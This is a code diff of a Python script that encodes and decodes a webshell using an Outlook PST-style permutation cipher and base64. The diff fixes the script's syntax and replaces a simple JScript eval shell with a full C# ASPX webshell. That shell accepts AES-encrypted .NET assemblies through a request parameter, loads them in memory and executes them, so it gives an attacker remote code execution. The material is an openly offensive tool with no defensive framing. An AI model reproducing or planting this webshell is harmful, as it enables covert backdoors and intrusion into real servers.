@@ -1,5 +1,5 @@
-#!usrbinpython
-#coding UTF-8
+#!/usr/bin/python
+#coding: UTF-8
 
 import base64
 import six
@@ -107,37 +107,37 @@ mpbbCrypt = [
 ]
 
 mpbbR = mpbbCrypt
-mpbbS = mpbbCrypt[256]
-mpbbI = mpbbCrypt[512]
+mpbbS = mpbbCrypt[256:]
+mpbbI = mpbbCrypt[512:]
 
 
-def cryptpermute(data, encrypt=False)
+def cryptpermute(data, encrypt=False):
     table = mpbbR if encrypt else mpbbI
     tmp = [table[v] for v in data] if six.PY3 else [table[ord(v)] for v in data]
     i = 0
     buf = bytes(tmp) if six.PY3 else bytearray(tmp)
     stream = BytesIO(buf)
-    while True
+    while True:
         b = stream.read(DWORD_SIZE)
-        try
+        try:
             tmp[i] = b[0]
             tmp[i + 1] = b[1]
             tmp[i + 2] = b[2]
             tmp[i + 3] = b[3]
             i += DWORD_SIZE
-        except
+        except:
             pass
-        if len(b) != DWORD_SIZE
+        if len(b) != DWORD_SIZE:
             break
 
     return bytes(tmp) if six.PY3 else ''.join(tmp)
 
-if __name__ == __main__
-    webshell = bscript language='JScript' runat='server' Page aspcompat=truefunction Page_Load(){eval(Request['cmd'],'unsafe');}script
+if __name__ == "__main__":
+    webshell = b'''<%@ Page Language="C#"%><%try{string key = "3c6e0b8a9c15224a";string pass = "pass";string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");byte[] data = System.Convert.FromBase64String(Context.Request[pass]);data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);if (Context.Application["payload"] == null){ Context.Application["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ;}else{ object o = ((System.Reflection.Assembly)Context.Application["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(data); byte[] r = System.Convert.FromBase64String(o.ToString()); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16));}}catch(System.Exception){}%>'''
     v1 = cryptpermute(webshell, False)
     b64_data = base64.b64encode(v1).decode()
-    print([+] Encode webshell ⬇n{}n.format(b64_data))
+    print("[+] Encode webshell ⬇\n{}\n".format(b64_data))
 
     encode_shell = base64.b64decode(b64_data)
     decode_shell = cryptpermute(encode_shell, True)
-    print([+] Decode webshell ⬇n{}n.format(decode_shell.decode()))
+    print("[+] Decode webshell ⬇\n{}\n".format(decode_shell.decode()))
